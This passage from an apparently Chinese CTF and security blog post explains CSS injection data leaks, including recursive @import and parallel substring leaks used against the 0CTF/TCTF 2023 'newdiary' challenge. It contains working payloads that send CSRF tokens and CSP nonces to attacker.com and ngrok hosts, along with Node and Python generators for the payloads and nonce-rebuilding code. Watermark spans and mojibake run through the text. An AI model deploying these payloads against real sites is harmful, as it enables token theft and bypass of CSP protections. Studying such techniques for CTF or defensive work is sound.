<span class="token selector">input[name=xsrf][value^=sc]</span> <span class="token punctuation">{</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=sc<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token selector">...
input[name=xsrf][value^=sZ]</span> <span class="token punctuation">{</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=sZ<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre>
<p>é‡å¤æ­¤è¿‡ç¨‹ï¼Œç›´åˆ°ä¸å†<span class="hexo-wm">ğ¬ï»¿Â³ğ˜·ğnâˆ™ï»¿ğ˜€â…ˆâ€‹ï»¿ğ’•ğï»¿</span>æœ‰é•¿è½®è¯¢è¿æ¥æ‰“å¼€ã€‚</p>
<h3 id="7-5-é€’å½’å¯¼å…¥å·¥å…·"><a href="#7-5-é€’å½’å¯¼å…¥å·¥å…·" class="headerlink" title="7.5 é€’å½’å¯¼å…¥å·¥å…·"></a>7.5 é€’å½’å¯¼å…¥å·¥å…·</h3><p><a href="https://github.com/d0nutptr/sic">https://github.<span class="hexo-wm">Ñ•â€Â³â…´ï½…ï½â€¤ï»¿ï»¿ğ˜€ğ¢â€‹â€ğ­ï½…â€‹</span>com/d0nutptr/sic</a></p>
<h3 id="7-6-æ³¨æ„äº‹é¡¹"><a href="#7-6-æ³¨æ„äº‹é¡¹" class="headerlink" title="7.6 æ³¨æ„äº‹é¡¹"></a>7.6 æ³¨æ„äº‹é¡¹</h3><h4 id="7-6-1-è¯·æ±‚æ•°é‡é™åˆ¶é—®é¢˜"><a href="#7-6-1-è¯·æ±‚æ•°é‡é™åˆ¶é—®é¢˜" class="headerlink" title="7.6.1 è¯·æ±‚æ•°é‡é™åˆ¶é—®é¢˜"></a>7.6.1 è¯·æ±‚æ•°é‡é™åˆ¶é—®é¢˜</h4><p>ç”±äºæµè§ˆå™¨å¯¹äºåŒä¸€ä¸ª domain èƒ½åŒæ—¶è½½å…¥çš„è¯·æ±‚æ•°é‡æœ‰é™åˆ¶ï¼Œ<br>å¦‚æœåœ¨æ³¨å…¥æ—¶å‡ºç°è¯·æ±‚ä¸¢å¤±çš„æƒ…å†µï¼Œå¯ä»¥å°† background-imageurl <span class="hexo-wm">Ñ•â€ŒÂ³ğ¯ğğ§ï¼ï»¿ï»¿sğ˜ªâ€â€‹ğ­ï½…â€Œï»¿</span>è®¾ç½®ä¸ºå¦ä¸€ä¸ªäºŒçº§åŸŸå (å¦‚ a.attacker.com ç­‰)</p>
<h4 id="7-6-2-Firefox-ç‰¹æ®Šå¤„ç†"><a href="#7-6-2-Firefox-ç‰¹æ®Šå¤„ç†" class="headerlink" title="7.6.2 Firefox ç‰¹æ®Šå¤„ç†"></a>7.6.2 Firefox ç‰¹æ®Šå¤„ç†</h4><p>åœ¨ Firefox ä¸Šå¯¹äº @import çš„å¤„ç†æœ‰äº›ç‰¹æ®Šï¼Œå°±ç®—ç¬¬ä¸€ä¸ªçš„è¯·æ±‚å…ˆè¿”å›ï¼Œ<br>ä¹Ÿä¸ä¼šç«‹åˆ»æ›´æ–°styleï¼Œè¦ç­‰æ‰€æœ‰request <span class="hexo-wm">ğ˜´â€Œâ€‹3â…´â„¯nâˆ™ï»¿â€‹ğ˜´ğ˜ªâ€Œï½”eï»¿</span>éƒ½å›æ¥æ‰ä¼šä¸€èµ·æ›´æ–°ã€‚<br>å¦‚æœ xssbot ä½¿ç”¨çš„æ˜¯ Firefox ï¼Œåˆ™éœ€è¦å¯¹ payload åšå¦‚ä¸‹ç‰¹æ®Šå¤„ç†ï¼š</p>
<pre class="language-none"><code class="language-none">&lt;style&gt;@import url(https://myserver.com/payload?len=1)&lt;/style&gt;
&lt;style&gt;@import url(https://myserver.com/payload?len=2)&lt;/style&gt;
&lt;style&gt;@import url(https://myserver.com/payload?len=3)&lt;/style&gt;
&lt;style&gt;@import url(https://myserver.com/payload?len=4)&lt;/style&gt;
&lt;style&gt;@import url(https://myserver.com/payload?len=5)&lt;/style&gt;
&lt;style&gt;@import url(https://myserver.com/payload?len=6)&lt;/style&gt;
&lt;style&gt;@import url(https://myserver.com/payload?len=7)&lt;/style&gt;
&lt;style&gt;@import url(https://myserver.com/payload?len=8)&lt;/style&gt;</code></pre>
<p>ç”±äº Chrome ä¹Ÿæ”¯æŒä»¥ä¸Šå†™æ³•ï¼Œ<span class="hexo-wm">Ñ•â€‹3ğ¯â„¯ğ§â€¤ï»¿ğ˜€ğ˜ªâ€Œâ€‹ğ’•eâ€Œ</span>æ‰€ä»¥å»ºè®®ä½¿ç”¨ä»¥ä¸Šå†™æ³•æ¥åŒæ—¶æ”¯æŒä¸¤ç§ xssbot</p>
<h2 id="8-å¹¶è¡Œæ³„éœ²ç»„åˆ"><a href="#8-å¹¶è¡Œæ³„éœ²ç»„åˆ" class="headerlink" title="8. å¹¶è¡Œæ³„éœ²ç»„åˆ"></a>8. å¹¶è¡Œæ³„éœ²ç»„åˆ</h2><p>å½“ç›®æ ‡é¡µé¢é€šè¿‡ <span class="hexo-wm">Ñ•â€‹â€ŒğŸ¯ğ˜·â„¯ğ§ï¼â€Œsiâ€Œğ­ğï»¿ï»¿</span>CSP é™åˆ¶äº† <code>style-src</code> æ—¶ï¼Œ<br>æˆ‘ä»¬å°†æ— æ³•ä½¿ç”¨ @importé€’å½’å¯¼å…¥ å¼•å…¥å¤–éƒ¨æ ·å¼è¡¨<br>ä½†åœ¨ Black Hat Asia 2023 ä¸­é¦–æ¬¡æåˆ°äº†å…³äºå¹¶è¡Œæ³„éœ²ç»„åˆçš„æ–¹æ³•<br>åœ¨æœ¬æ–‡ä¸­æˆ‘å°†ä»¥ 0CTF/TCTF 2023 - newdiary ä¸€é¢˜ä»‹ç»æœ¬æ–¹æ³•çš„ä½¿ç”¨</p>
<p>æœ¬é¢˜ä¸­çš„ CS<span class="hexo-wm">ğ˜€â€Â³ğ’—ğ˜¦ğ’ï¼â€â€Œğ¬iâ€Œğ­ï½…ï»¿</span>P ç­–ç•¥å¦‚ä¸‹ï¼š</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span>
    <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'nonce-&lt;%= nonce %&gt;'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span></code></pre>
<p>ç”±äº CSP ä¸­ä½¿ç”¨äº† <code>style-src https://unpkg.com</code>ï¼Œè€Œ unpkg ä»…ä¸º npm çš„ä¸€ä¸ª cdnï¼Œ<br>å› æ­¤æ­¤å¤„å¯ä»¥è®¤ä¸ºæ˜¯å…è®¸ä»»ä½•çš„å¤–éƒ¨ styleï¼Œä½†æ— æ³•ä½¿ç”¨ @import è¿›è¡Œé€’å½’å¯¼å…¥ã€‚</p>
<p>è€Œåˆå› ä¸º CSP ä¸­è®¾ç½®äº† Script çš„ nonceï¼Œä»…æœ‰æºå¸¦ç›¸åº” nonce å±æ€§å’Œå€¼çš„ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œ<br>å› æ­¤åœ¨æœ¬é¢˜ä¸­æˆ‘ä»¬è¦ä½¿ç”¨ CSS Injection æ¥çªƒå–é¡µé¢ä¸­çš„ nonce</p>
<h3 id="8-1-nonce-åˆ‡å‰²"><a href="#8-1-nonce-åˆ‡å‰²" class="headerlink" title="8.1 nonce åˆ‡å‰²"></a>8.1 nonce åˆ‡å‰²</h3><p>æˆ‘ä»¬é€šè¿‡å°†ç›®æ ‡ nonce åˆ‡å‰²æˆå¤šä¸ªå¯èƒ½å€¼è¾ƒå°‘çš„å°å—ï¼Œå¹¶ä¸ç«‹å³æ³„éœ²å‡ºæ•´ä¸ª nonceï¼Œ<br>è€Œæ˜¯å¹¶è¡Œæ³„éœ²æ‰€æœ‰é•¿ä¸º 3 å­—ç¬¦çš„ <span class="hexo-wm">ğ˜´â€‹â€3ğ˜·ï½…ğ§.ï»¿êœ±ğ¢â€ğ˜µâ„®â€‹</span>nonce è¿ç»­å­ä¸²ï¼Œ<br>ä¾‹å¦‚ï¼Œå¯¹äº <code>8c2a19fa-8dcd-44d1-807c-1c65abef0251</code> ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·æ“ä½œï¼š</p>
<p><img src="image-5.png" alt="image-5.png"></p>
<h3 id="8-2-è§£å†³å±æ€§è¦†ç›–é—®é¢˜"><a href="#8-2-è§£å†³å±æ€§è¦†ç›–é—®é¢˜" class="headerlink" title="8.2 è§£å†³å±æ€§è¦†ç›–é—®é¢˜"></a>8.2 è§£å†³å±æ€§è¦†ç›–é—®é¢˜</h3><h4 id="8-2-1-åˆ©ç”¨-cross-fade-å‡½æ•°"><a href="#8-2-1-åˆ©ç”¨-cross-fade-å‡½æ•°" class="headerlink" title="8.2.1 åˆ©ç”¨ cross-fade() å‡½æ•°"></a>8.2.1 åˆ©ç”¨ cross-fade() å‡½æ•°</h4><blockquote>
<p>cross-fade() CSS å‡½æ•°ä½¿ç”¨å¤šä¸ªå›¾åƒå’Œç™¾åˆ†æ¯”çš„ç»„åˆä½œä¸ºå‚æ•°ï¼Œå¹¶è¿”å›å åŠ ä¸¤ä¸ªå›¾åƒåæ‰€äº§ç”Ÿçš„å›¾åƒ<br>å¦‚æœçœç•¥ä»»ä½•ç™¾åˆ†æ¯”ï¼Œåˆ™å°†100%å‡å»æ‰€æœ‰æŒ‡å®šçš„ç™¾åˆ†æ¯”çš„å’Œï¼Œ<span class="hexo-wm">ğ˜´â€‹ğŸ¯ğ˜·ğğ’âˆ™â€Œâ€Ñ•ğ¢ï»¿â€‹ğ’•ğï»¿</span>å¦‚æœç»“æœå¤§äº <span class="hexo-wm">Ñ•â€â€3â…´ğ˜¦ï½.â€Œâ€‹êœ±ğ˜ªâ€Œâ€ğ˜µğï»¿</span>0%ï¼Œåˆ™ç»“æœå°†å¹³å‡åˆ†é…ç»™æ‰€æœ‰å›¾åƒã€‚</p>
</blockquote>
<p>é€šè¿‡åˆ©ç”¨ cross-fade() å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é¿å…åŒä¸€å±æ€§è¢«æœ€åä¸€ä¸ªè®¾å®šè¦†ç›–è€Œå¯¼è‡´ä»…æœ‰æœ€åä¸€ä¸ªè®¾å®šè¢«è¯·æ±‚çš„é—®é¢˜<br>Payload å¦‚ä¸‹ï¼š</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">img[src*="abc"]</span> <span class="token punctuation">{</span> <span class="token property">--abc</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"//attacker.com/abc"</span><span class="token punctuation">)</span></span> <span class="token punctuation">}</span>
<span class="token selector">img[src*="bcd"]</span> <span class="token punctuation">{</span> <span class="token property">--bcd</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"//attacker.com/bcd"</span><span class="token punctuation">)</span></span> <span class="token punctuation">}</span>
<span class="token comment">/* ... */</span>

<span class="token selector">img</span> <span class="token punctuation">{</span>
    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">cross-fade</span><span class="token punctuation">(</span>
        <span class="token function">cross-fade</span><span class="token punctuation">(</span><span class="token function">var</span><span class="token punctuation">(</span>--abc<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">var</span><span class="token punctuation">(</span>--bcd<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span> 50%<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">cross-fade</span><span class="token punctuation">(</span><span class="token comment">/* ... */</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        50%
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>ç”Ÿæˆ Payl<span class="hexo-wm">ğ¬â€‹Â³â…´ï½…ï½ï¼â€‹â€ŒÑ•â…ˆâ€Œâ€ğ’•eï»¿</span>oad ä»£ç å¦‚ä¸‹ï¼š</p>
<pre class="language-none"><code class="language-none">const fs = require('fs')
let chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
const host = 'https://ip.ngrok-free.app'

let arr = []
for(let a of chars) {
    for(let b of chars) {
        for(let c of chars) {
            let str = a+b+c;
            arr.push(str)
        }
    }
}

let payload1 = ''
let crossPayload1 = 'url("/")'
let payload2 = ''
let crossPayload2 = 'url("/")'
let payload3 = ''
let crossPayload3 = 'url("/")'

const third = Math.floor(arr.length / 3);
const arr1 = arr.slice(0, third); 
const arr2 = arr.slice(third, 2 * third); 
const arr3 = arr.slice(2 * third); 

for(let str of arr1) {
    payload1 += `script[nonce*="${str}"]{--${str}:url("${host}/leak?q=${str}")}\n`
    crossPayload1 = `-webkit-cross-fade(${crossPayload1}, var(--${str}, none), 50%)`
}

for(let str of arr2) {
    payload2 += `script[nonce*="${str}"]{--${str}:url("${host}/leak?q=${str}")}\n`
    crossPayload2 = `-webkit-cross-fade(${crossPayload2}, var(--${str}, none), 50%)`
}

for(let str of arr3) {
    payload3 += `script[nonce*="${str}"]{--${str}:url("${host}/leak?q=${str}")}\n`
    crossPayload3 = `-webkit-cross-fade(${crossPayload3}, var(--${str}, none), 50%)`
}

payload1 = `${payload1} script{display:block;} script{background-image: ${crossPayload1}}`
payload2 = `${payload2}script:after{content:'a';display:block;background-image:${crossPayload2} }`
payload3 = `${payload3}script:before{content:'a';display:block;background-image:${crossPayload3} }`

fs.writeFileSync('exp1.css', payload1, 'utf-8');
fs.writeFileSync('exp2.css', payload2, 'utf-8');
fs.writeFileSync('exp3.css', payload3, 'utf-8');</code></pre>
<p>è¿™é¢˜å¦‚æœæŠŠå…¨éƒ¨è§„åˆ™éƒ½å¥—åœ¨åŒä¸€ä¸ªå…ƒç´ ä¸Šï¼Œ<span class="hexo-wm">êœ±â€Œâ€Œâ‘¶â…´ï½…ï½ï¼â€ğ’”ğ¢â€Œâ€‹tğï»¿â€</span>ä¼¼ä¹ä¼šå› ä¸ºè§„åˆ™å¤ªå¤šä¹‹ç±»çš„è®© Chrome ç›´æ¥crashï¼Œ<br>ï¼ˆä¸è¿‡ä¸å½±å“æœ€ç»ˆè¯·æ±‚çš„å‘é€ï¼‰<br>æ‰€ä»¥éœ€è¦æŠŠæŠŠè§„åˆ™åˆ†ä¸ºä¸‰ä»½ï¼Œé¡ºä¾¿å¥—åœ¨ä¸‰ä¸ªä¸åŒå…ƒç´ ä¸Šã€‚</p>
<h4 id="8-2-2-ä½¿ç”¨-var-å˜é‡æ³•"><a href="#8-2-2-ä½¿ç”¨-var-å˜é‡æ³•" class="headerlink" title="8.2.2 ä½¿ç”¨ var å˜é‡æ³•"></a>8.2.2 ä½¿ç”¨ var å˜é‡æ³•</h4><p>Payloadï¼š</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">:has(script[nonce*="aaa"])</span><span class="token punctuation">{</span><span class="token property">--tosend-aaa</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>...?x=aaa<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token selector">:has(script[nonce*="aab"])</span><span class="token punctuation">{</span><span class="token property">--tosend-aab</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>...?x=aab<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token selector">:has(script[nonce*="aac"])</span><span class="token punctuation">{</span><span class="token property">--tosend-aac</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>...?x=aac<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">}</span>

<span class="token selector">[...]

input</span><span class="token punctuation">{</span>
    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--tosend-aaa<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">var</span><span class="token punctuation">(</span>--tosend-aab<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">var</span><span class="token punctuation">(</span>--tosend-aac<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">var</span><span class="token punctuation">(</span>--tosend-aad<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span>
    [...]
<span class="token punctuation">}</span></code></pre>
<p>ç”Ÿæˆ Payload<span class="hexo-wm">ğ¬â€ï»¿Â³ğ¯ğ˜¦nâˆ™â€Œğ˜€ğ˜ªâ€Œï»¿ï½”â„®â€Œ</span> ä»£ç å¦‚ä¸‹ï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools

charset <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789"</span>

perms <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">,</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span>charset<span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"leak.css"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    <span class="token keyword">for</span> i<span class="token punctuation">,</span> x <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>perms<span class="token punctuation">)</span><span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f""":has(script[nonce*="</span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token punctuation">}</span></span><span class="token string">"]){{--tosend-</span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token punctuation">}</span></span><span class="token string">: url(https://25de-37-160-34-111.ngrok-free.app/?x=</span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token punctuation">}</span></span><span class="token string">);}}"""</span></span><span class="token punctuation">)</span>


    data <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"loading"</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> perms<span class="token punctuation">:</span>
        data <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"var(--tosend-</span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token punctuation">}</span></span><span class="token string">, none),"</span></span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"done"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"writing"</span><span class="token punctuation">)</span>
    
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">"""
input{
background: %s
}
"""</span> <span class="token operator">%</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h3 id="8-3-nonce-å¤åŸ"><a href="#8-3-nonce-å¤åŸ" class="headerlink" title="8.3 nonce å¤åŸ"></a>8.3 nonce å¤åŸ</h3><h4 id="8-3-1-å¤åŸåŸç†"><a href="#8-3-1-å¤åŸåŸç†" class="headerlink" title="8.3.1 å¤åŸåŸç†"></a>8.3.1 å¤åŸåŸç†</h4><ol>
<li>æ‰¾åˆ°å¼€å¤´çš„é•¿ä¸ºä¸‰ä¸ªå­—ç¬¦çš„å­ä¸²ï¼ˆå³å¼€å¤´çš„ä¸¤ä¸ª<span class="hexo-wm">ğ˜€â€ï»¿3ğ˜·eğ’Â·â€‹â€‹ğ¬ï½‰â€‹tğï»¿â€Œ</span>å­—ç¬¦åŒ¹é…ä¸åˆ°å‰©ä½™å­ä¸²æœ«å°¾çš„ä¸¤ä¸ªå­—ç¬¦çš„å­ä¸²ï¼‰</li>
<li>é€šè¿‡å·²çŸ¥ nonce éƒ¨åˆ†æœ«å°¾çš„ä¸¤ä¸ªå­—ç¬¦ä¸å‰©ä½™<span class="hexo-wm">Ñ•ï»¿3â…´ğ˜¦ğ˜¯âˆ™â€Œsğ˜ªâ€â€Œğ’•ğâ€Œ</span>å­ä¸²çš„å¼€å¤´ä¸¤ä¸ªå­—ç¬¦çš„åŒ¹é…æ¥è¿æ¥ nonce å­ä¸²</li>
<li>é‡å¤æ­¥éª¤ 2 <span class="hexo-wm">sï»¿Â³â…´ğ˜¦ï½â€¤â€‹sï½‰â€Œğ’•eâ€‹</span>ç›´åˆ°æ‰€æœ‰å­ä¸²è¢«è¿æ¥å®Œæ¯•</li>
<li>è¿˜åŸæ•´ä¸ª nonce</li>
</ol>
<h4 id="8-3-2-JavaScript-å®ç°"><a href="#8-3-2-JavaScript-å®ç°" class="headerlink" title="8.3.2 JavaScript å®ç°"></a>8.3.2 JavaScript å®ç°</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span> ending</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> ending
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ending<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">let</span> isFound <span class="token operator">=</span> <span class="token boolean">false</span>
      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> j<span class="token punctuation">)</span> <span class="token keyword">continue</span>

        <span class="token keyword">let</span> suffix <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> 
        <span class="token keyword">let</span> prefix <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>suffix <span class="token operator">===</span> prefix<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          isFound <span class="token operator">=</span> <span class="token boolean">true</span>
          <span class="token keyword">continue</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isFound<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ending:'</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=&gt;</span> item<span class="token operator">!==</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Error, please try again'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">let</span> found <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> length <span class="token operator">=</span> ending<span class="token punctuation">.</span>length
    <span class="token keyword">let</span> suffix <span class="token operator">=</span> ending<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> ending<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">let</span> prefix <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>suffix <span class="token operator">===</span> prefix<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      found<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=&gt;</span> item<span class="token operator">!==</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> ending<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> found<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span></code></pre>
<h4 id="8-3-3-Python-å®ç°"><a href="#8-3-3-Python-å®ç°" class="headerlink" title="8.3.3 Python å®ç°"></a>8.3.3 Python å®ç°</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">retrieveNonce</span><span class="token punctuation">(</span>nonce_substr<span class="token operator">=</span>nonce_substr<span class="token punctuation">,</span> force<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># find the beginning of the nonce (there is no match for start)</span>
    new_substr <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>nonce_substr<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_substr<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">30</span> <span class="token keyword">and</span> <span class="token keyword">not</span> force<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"different length of new_substr [</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_substr<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">] - aborting"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    backup <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    nonce <span class="token operator">=</span> <span class="token string">''</span>
    remove_i <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_substr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
